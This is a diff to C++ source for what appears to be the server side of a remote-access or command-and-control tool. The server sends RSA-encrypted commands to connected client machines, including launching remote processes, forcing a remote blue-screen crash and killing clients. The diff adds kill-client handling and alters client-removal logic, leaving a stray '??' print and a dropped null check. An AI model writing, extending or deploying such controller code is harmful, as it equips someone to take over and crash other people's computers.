@@ -578,24 +578,29 @@ bool ServerInterface::HandleUserInput(unsigned int command, Packet& outputComman
     switch ( command ) {
     case RemoteAction::kOpenRemoteProcess: {
         std::string input;
-        
+
         std::cout << "Arguments for " << kOpenRemoteProcess << ": ";
         std::getline(std::cin, input);
-        
+
         std::cout << "Input name of flags: ";
         std::string flagInput;
         std::getline(std::cin, flagInput);
-        
-        cmdInfo.flags = GetFlagsFromInput(flagInput);        
+
+        cmdInfo.flags = GetFlagsFromInput(flagInput);
         cmdInfo.insert(input);
 
         if ( cmdInfo.buffLen == -1 ) // error
             break;
 
         performed = true;
-        break;        
+        break;
     }
     case RemoteAction::kKillClient:
+        cmdInfo.flags = PACKET_IS_A_COMMAND | NO_CONSOLE;
+        cmdInfo.action = RemoteAction::kKillClient;
+        cmdInfo.buffLen = 0;
+        std::cout << "??" << std::endl;
+        performed = true;
         break;
     // no additional user input required 
     case RemoteAction::kRemoteBSOD:
@@ -622,13 +627,10 @@ void ServerInterface::SendCommandsToClients() {
 }
 
 void ServerInterface::RemoveClientFromServer(Client* client) {
-    if ( !client || ClientIsInClientList(client->ClientUID) )
+    if ( client->Alive == FALSE )
         return;
-    
-    this->m_ClientListMutex.lock();
-    this->m_ClientList.erase(client->ClientUID);
-    this->m_ClientListMutex.unlock();
 
+    client->Alive = FALSE;
     client->Disconnect();
 }
 
@@ -648,7 +650,7 @@ void ServerInterface::RunUserInputOnClients() {
         Sleep(100);
 
     std::cout << "Running commands on remote hosts.\n";
-    while ( this->m_TCPServerDetails.alive && m_ClientList.size() > 0 ) {
+    while ( this->m_TCPServerDetails.alive ) {
         // select which client to run command on
         std::string  clientID;    
         long         lClientID     = 0;
@@ -725,11 +727,22 @@ void ServerInterface::RunUserInputOnClients() {
         if ( !globalCommand ) {
             BYTESTRING encrypted = LGCrypto::RSAEncrypt(serialized, client->ClientPublicKey, FALSE);
             sent = m_NetworkManager.TransmitData(encrypted, client->GetSocket(), TCP);
+
+            if ( toSend.action == kKillClient )
+                RemoveClientFromServer(client);
         } else {
             this->m_ClientListMutex.lock();
             for ( auto& [ cuid, host ] : this->m_ClientList ) {
+                if ( host.Alive == FALSE )
+                    continue;
+
                 BYTESTRING encrypted = LGCrypto::RSAEncrypt(serialized, host.ClientPublicKey, FALSE);
                 sent = m_NetworkManager.TransmitData(encrypted, host.GetSocket(), TCP);
+
+                if ( toSend.action == kKillClient ) {
+                    Sleep(100);
+                    RemoveClientFromServer(&host);
+                }
             }
             this->m_ClientListMutex.unlock();
         }
